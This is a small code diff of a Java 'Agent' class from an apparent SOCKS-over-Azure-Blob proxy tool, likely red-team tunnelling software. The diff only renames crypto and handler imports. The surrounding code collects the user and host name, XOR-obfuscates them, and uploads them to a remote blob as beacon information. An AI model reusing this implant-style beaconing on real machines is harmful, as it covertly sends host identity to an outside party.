@@ -6,8 +6,8 @@ import com.azure.storage.blob.BlobServiceClient;
 import com.azure.storage.blob.BlobServiceClientBuilder;
 import com.azure.storage.blob.models.BlobHttpHeaders;
 import com.azure.storage.blob.specialized.BlockBlobClient;
-import com.proxyblob.protocol.crypto.CipherUtil;
-import com.proxyblob.protocol.handler.BaseHandler;
+import com.proxyblob.protocol.CryptoUtil;
+import com.proxyblob.protocol.BaseHandler;
 import com.proxyblob.proxy.socks.SocksHandler;
 import com.proxyblob.transport.BlobTransport;
 import lombok.Getter;
@@ -55,7 +55,7 @@ public class Agent {
     public void updateInfoBlob() {
         try {
             String info = System.getProperty("user.name") + "@" + java.net.InetAddress.getLocalHost().getHostName();
-            byte[] encrypted = CipherUtil.xor(info.getBytes(StandardCharsets.UTF_8), INFO_KEY);
+            byte[] encrypted = CryptoUtil.xor(info.getBytes(StandardCharsets.UTF_8), INFO_KEY);
 
             BlockBlobClient blob = container.getBlobClient("info").getBlockBlobClient();
             blob.upload(new ByteArrayInputStream(encrypted), encrypted.length, true);
